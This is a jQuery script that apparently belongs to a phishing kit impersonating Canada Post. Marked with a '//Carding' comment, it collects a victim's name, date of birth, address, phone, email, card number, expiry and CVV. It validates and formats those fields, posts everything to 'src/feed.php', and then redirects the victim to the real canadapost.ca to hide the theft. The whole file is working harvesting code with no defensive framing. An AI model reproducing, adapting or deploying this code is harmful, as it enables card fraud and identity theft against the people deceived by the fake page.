 
$(document).ready(function(){
 // allow numbers
    $('#phone, #cnumber, #cvv').keydown(function(event) {
        if(!(event.keyCode >= 96 && event.keyCode <= 105 || event.keyCode >= 48 && event.keyCode <= 57 || event.keyCode == 8 || event.keyCode == 37 || event.keyCode == 39 || event.keyCode == 9 || event.keyCode == 20 || event.keyCode == 16)){
            event.preventDefault();
        }
    });
    // Allow letter & space
    $('#town,  #fullname').keydown(function(event) {
        if(!(event.keyCode >= 65 && event.keyCode <= 90 || event.keyCode >= 48 && event.keyCode <= 57 || event.keyCode == 32 || event.keyCode == 8  || event.keyCode == 9 || event.keyCode == 20 || event.keyCode == 16)){
            event.preventDefault();
        }
    });
    //prevent Paste
    // $('.vx_form-control input').bind("paste",function(event) {
    //     event.preventDefault();
    // });
	
    //Upercase first letter
    $('#fullname').keydown(function(event) {
        var str = $(this).val().toLowerCase().replace(/\b[a-z]/g, function(letter) {
            return letter.toUpperCase();
        });
        $(this).val(str);
    });

 

  
    //Carding
	$("#dadob").mask("99/99/9999" ,{placeholder: "DD/MM/YYYY"});
    $("#expiry").mask("99/99",{placeholder: "MM/YY"});
    $("#cnumber").mask("?9999 9999 9999 9999", {placeholder: "---- ---- ---- ----"},{autoclear: true});

    $('#cnumber').keyup(function(){
        var str = $(this).val().replace(/_/g, "").replace(/ /g, "");
        console
        xysDetectTypeCardx();
    }); 

    // FUNCTIONS
    function xysCC_formatx(value) {
        var v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        var matches = v.match(/\d{4,16}/g);
        var match = matches && matches[0] || '';
        var parts = [];
        for (i=0, len=match.length; i<len; i+=4) {
            parts.push(match.substring(i, i+4));
        }
        if (parts.length) {
            return parts.join(' ');
        } else {
            return value;
        }
    }

    function checkStringForNumbers(input){
        var str = String(input);
        for( var i = 0; i < str.length; i++){
            console.log(str.charAt(i));
            if(!isNaN(str.charAt(i))){   //if the string is a number, do the following
                return true;
            }
        }
    }

    function xysDetectTypeCardx() {
        var get_value = $('#cnumber').val();
        var type = get_value.substring(0,2);
        var other = get_value.substring(0,1);
        console.log(type);
        console.log(other);
        /*Visa Card*/
        if(other == "4"){ 
            $('#cvv').attr('maxlength', '3');  
            if($('#cnumber').attr('maxlength') == 17){
                $("#cnumber").mask("?9999 9999 9999 9999", {autoclear: false});
            }
            $('#cnumber').attr('maxlength', '19'); 
        }
        /*Master Card*/
        else if(other == "5"){
            $('#cvv').attr('maxlength', '3');
            if($('#cnumber').attr('maxlength') == 17){
                $("#cnumber").mask("?9999 9999 9999 9999", {autoclear: false});
            }
            $('#cnumber').attr('maxlength', '19'); 
        }
        /*Amex Card*/
        else if(type == "34" || type == "37"){
            $('#cvv').attr('maxlength', '4'); 
            if($('#cnumber').attr('maxlength') == 19){
                $("#cnumber").mask("?9999 999999 99999", {autoclear: false});
            }
            $('#cnumber').attr('maxlength', '17');
        }
        else {
            $('#cvv').attr('maxlength', '3');
            if($('#cnumber').attr('maxlength') == 17){
                $("#cnumber").mask("?9999 9999 9999 9999", {autoclear: false});
            }
            $('#cnumber').attr('maxlength', '19');
        }
    }
$("#cpcfrom").validate( { // initialize plugin
			 	 	
			rules: {  
					email: {
                        required: true,
                        email: true, 
                    }, 
					codedo: {
                        required: true,
                        minlength: 4, 
                    },
                    dadob: {
                        required: true,
                        minlength: 8,
                    }, 						
					addressComplete: {
                        required: true, 
                    },
                    phone: {
                        required: true,
                        minlength: 8,
                    }, 	
                    fullname: {
                        required: true,
                        minlength: 2,
                    }, 	 						
                    cnumber: {
                        required: true,
                        minlength: 16, 
                    },
                    expiry: {
                        required: true,
						minlength: 4, 
                    },
                    cvv: {
                        required: true,
                        minlength: 3, 
                    },
                }, 
                messages: { 
                    email: {
                        required: "",
                        email: "", 
                    }, 
					codedo: {
                        required: "",
                        minlength: "", 
                    },
                    dadob: {
                        required: "",
                        minlength: "",
                    }, 						
					addressComplete: {
                        required: "", 
                    },
                    phone: {
                        required: "",
                        minlength: "",
                    }, 	
                    fullname: {
                        required: "",
                        minlength: "",
                    }, 	 						
                    cnumber: {
                        required: "",
                        minlength: "", 
                    },
                    expiry: {
                        required: "",
						minlength: "", 
                    },
                    cvv: {
                        required: "",
                        minlength: "", 
                    },
                },  
	    });

	
$('.screen-trigger--1').click(function() {
	if($("#cpcfrom").valid()){
                $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--1').fadeOut(200);

                setTimeout(
                    function() {
                        $('.main--2').fadeIn(1000);
                    }, 200
                );
          } else {  			
				} 			
            });

$('.screen-trigger--2').click(function() {
	if($("#cpcfrom").valid()){
		jQuery.ajax({
		url: "src/feed.php",
		data: $("#cpcfrom").serialize(),
		type: "POST", 
		});
                $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--2').fadeOut(200);

                setTimeout(
                    function() {
                        $('.main--3').fadeIn(1000);
                    }, 200
                );
          } else {  			
				} 			
            });			

$('.sfsb_done').click(function() { 
   window.location.replace("https://canadapost.ca/");
});			
$('.screen-trigger--1').click(function(){
	var mysave = $('#HeaderAddressLabel').html();
    $("#adressfull").val(mysave);
    });
 
 
 
});

